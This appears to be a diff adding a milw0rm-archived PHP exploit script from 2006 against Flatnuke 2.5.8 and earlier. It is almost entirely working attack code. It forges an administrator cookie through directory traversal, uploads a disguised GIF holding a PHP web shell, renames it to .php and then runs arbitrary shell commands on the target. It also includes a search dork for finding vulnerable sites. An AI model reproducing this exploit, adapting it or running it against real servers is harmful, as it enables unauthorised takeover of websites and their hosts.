@@ -1,0 +1,183 @@
+#!/usr/bin/php -q -d short_open_tag=on
+<?
+print_r('
+-----------------------------------------------------------------------------
+Flatnuke <=2.5.8 file()/privilege escalation/remote commands xctn exploit
+by rgod rgod@autistici.org
+site: http://retrogod.altervista.org
+dork: "FlatNuke" "Valid HTML 4.01!" "Valid CSS!" "Get RSS 2.0 Feed" "Get RSS
+      2.0 Feed"
+-----------------------------------------------------------------------------
+');
+
+/*
+works regardless of php.ini settings
+*/
+
+if ($argc<4) {
+print_r('
+-----------------------------------------------------------------------------
+Usage: php '.$argv[0].' host path cmd OPTIONS
+host:      target server (ip/hostname)
+path:      path to flatnuke
+cmd:       a shell command
+Options:
+ -p[port]:    specify a port other than 80
+ -P[ip:port]: specify a proxy
+Example:
+php '.$argv[0].' 2.2.2.2 /flatnuke/ ls -la -P1.1.1.1:80
+php '.$argv[0].' 1.1.1.1 /  -p81
+-----------------------------------------------------------------------------
+');
+die;
+}
+
+error_reporting(0);
+ini_set("max_execution_time",0);
+ini_set("default_socket_timeout",5);
+
+function quick_dump($string)
+{
+  $result='';$exa='';$cont=0;
+  for ($i=0; $i<=strlen($string)-1; $i++)
+  {
+   if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))
+   {$result.="  .";}
+   else
+   {$result.="  ".$string[$i];}
+   if (strlen(dechex(ord($string[$i])))==2)
+   {$exa.=" ".dechex(ord($string[$i]));}
+   else
+   {$exa.=" 0".dechex(ord($string[$i]));}
+   $cont++;if ($cont==15) {$cont=0; $result.="\r\n"; $exa.="\r\n";}
+  }
+ return $exa."\r\n".$result;
+}
+$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';
+function sendpacketii($packet)
+{
+  global $proxy, $host, $port, $html, $proxy_regex;
+  if ($proxy=='') {
+    $ock=fsockopen(gethostbyname($host),$port);
+    if (!$ock) {
+      echo 'No response from '.$host.':'.$port; die;
+    }
+  }
+  else {
+	$c = preg_match($proxy_regex,$proxy);
+    if (!$c) {
+      echo 'Not a valid proxy...';die;
+    }
+    $parts=explode(':',$proxy);
+    echo "Connecting to ".$parts[0].":".$parts[1]." proxy...\r\n";
+    $ock=fsockopen($parts[0],$parts[1]);
+    if (!$ock) {
+      echo 'No response from proxy...';die;
+	}
+  }
+  fputs($ock,$packet);
+  if ($proxy=='') {
+    $html='';
+    while (!feof($ock)) {
+      $html.=fgets($ock);
+    }
+  }
+  else {
+    $html='';
+    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
+      $html.=fread($ock,1);
+    }
+  }
+  fclose($ock);
+  #debug
+  #echo "\r\n".$html;
+}
+function make_seed()
+{
+   list($usec, $sec) = explode(' ', microtime());
+   return (float) $sec + ((float) $usec * 100000);
+}
+
+$host=$argv[1];
+$path=$argv[2];
+$cmd="";
+$admin="rgod";
+
+$port=80;
+$proxy="";
+for ($i=3; $i<$argc; $i++){
+$temp=$argv[$i][0].$argv[$i][1];
+if (($temp<>"-p") and ($temp<>"-P")) {$cmd.=" ".$argv[$i];}
+if ($temp=="-p")
+{
+  $port=str_replace("-p","",$argv[$i]);
+}
+if ($temp=="-P")
+{
+  $proxy=str_replace("-P","",$argv[$i]);
+}
+}
+if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}
+
+/*
+directory traversal in "myforum" cookie argument...
+pass stats file to file() in getsecid() function, we have a 10 in the right position (!!)
+and /misc/flatstat/2006/1.php can't change if you installed flatnuke after 2006, January
+so we are admin and we can upload a malicious .gif with php code, after we can rename it
+with .php extension, so... we launch commands
+*/
+
+//upload
+$data.='-----------------------------7d6224c08dc
+Content-Disposition: form-data; name="action"
+
+upload
+-----------------------------7d6224c08dc
+Content-Disposition: form-data; name="path"
+
+sections/Gallery
+-----------------------------7d6224c08dc
+Content-Disposition: form-data; name="file_up"; filename="suntzu.gif"
+Content-Type: text/plain
+
+GIF86<?php error_reporting(0); set_time_limit(0);echo "my_delim";passthru($_SERVER[HTTP_SUNTZU]);die;?>
+-----------------------------7d6224c08dc--
+';
+$packet ="POST ".$p."index.php?mod=Gallery HTTP/1.0\r\n";
+$packet.="Content-Type: multipart/form-data; boundary=---------------------------7d6224c08dc\r\n";
+$packet.="Content-Length: ".strlen($data)."\r\n";
+$packet.="Host: ".$host."\r\n";
+$packet.="Cookie: myforum=../../misc/flatstat/2006/1; secid=".md5("../../misc/flatstat/2006/1"."2|0").";\r\n";
+$packet.="Connection: Close\r\n\r\n";
+$packet.=$data;
+sendpacketii($packet);
+sleep(1);
+
+//rename
+$data='action=rename&path=sections%2FGallery&rename_from=sections%2FGallery%2Fsuntzu.gif&rename_to=suntzu.php';
+$packet ="POST ".$p."index.php?mod=Gallery HTTP/1.0\r\n";
+$packet.="Content-Type: application/x-www-form-urlencoded\r\n";
+$packet.="Content-Length: ".strlen($data)."\r\n";
+$packet.="Host: ".$host."\r\n";
+$packet.="Cookie: myforum=../../misc/flatstat/2006/1; secid=".md5("../../misc/flatstat/2006/1"."2|0").";\r\n";
+$packet.="Connection: Close\r\n\r\n";
+$packet.=$data;
+sendpacketii($packet);
+sleep(1);
+
+//launch commands
+$packet ="GET ".$p."sections/Gallery/suntzu.php HTTP/1.1\r\n";
+$packet.="SUNTZU: ".$cmd."\r\n";
+$packet.="Host: ".$host."\r\n";
+$packet.="Connection: Close\r\n\r\n";
+sendpacketii($packet);
+if (strstr($html,"my_delim"))
+{
+$temp=explode("my_delim",$html);
+die($temp[1]);
+}
+//if you are here...
+echo "exploit failed...";
+?>
+
+# milw0rm.com [2006-10-10]
